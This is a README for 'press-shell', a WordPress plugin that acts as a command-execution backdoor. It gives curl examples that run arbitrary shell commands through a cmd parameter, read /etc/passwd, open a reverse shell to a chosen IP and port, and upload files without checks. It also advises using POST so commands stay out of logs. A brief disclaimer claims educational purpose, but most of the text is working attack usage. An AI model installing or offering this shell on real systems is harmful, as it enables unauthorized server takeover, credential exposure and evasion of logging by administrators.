<p align='center'>
   <img src='.assets/backdoor.png' alt='' width='256' />
</p>

<h2 align='center'>press-shell</h2>

<p align='center'><i>Quick & dirty Wordpress Command Execution Shell.</i></p>

Execute shell  commands on  your wordpress  server. Uploaded  shell will
probably be at `<your-host>/wp-content/plugins/shell/shell.php`

### Installation

To install the shell, we are  assuming you have administrative rights to
Wordpress and can  install plugins since transferring a PHP  file to the
media  library  shouldn't work  anyway.  Otherwise,  you have  a  bigger
problem.

Simply upload  the zip  file located  in the Releases  section as  a new
extension and you're good to go.

### Usage

Using  the shell  is straightforward.  Simply pass  `sh` commands  as an
argument to the shell :

```sh
❯ curl 'http://host/.../shell.php?cmd=uname+-a'
Linux wordpress-server 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux
```

You may  as well pass  these arguments in a  POST request, which  is the
recommended way to keep your commands out of logs.

```sh
❯ curl 'http://host/.../shell.php' --data-urlencode 'cmd=ls'
LICENSE
README.md
shell.php
```

More complex  commands are  also supported,  careful about  your quoting
though.

```sh
❯ curl 'http://host/.../shell.php' --data-urlencode 'cmd=cat /etc/passwd | grep -v "\(false\|nologin\)"'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
```

```sh
❯ curl 'http://host/.../shell.php' --data-urlencode 'cmd=python -c "from urllib.parse import urlencode; print(urlencode({\"cmd\": \"uname -a\"}))"'
cmd=uname+-a
```

You can also open a reverse  shell using the `ip` and `port` parameters.
The default port is `443`.

```sh
❯ curl 'http://host/.../shell.php' --data-urlencode 'ip=127.0.0.1'
```

```sh
❯ curl 'http://host/.../shell.php' --data-urlencode 'ip=127.0.0.1' --data-urlencode 'port=1337'
```

There is also an option provided for convenience to upload a file to the
directory of the plugin *unconditionally and without checks*.

```sh
❯ curl 'http://host/.../shell.php' -F 'file=@some_file'
❯ curl 'http://host/.../shell.php' --data-urlencode 'cmd=ls'
LICENSE
README.md
shell.php
some_file
```

### Disclaimer

Running unathorized attacks to public or private servers is illegal. The
content  of this  repository is  for  educational purposes  only and  no
responsibility will be  taken by the authors  in case of ill  use of the
provided material.
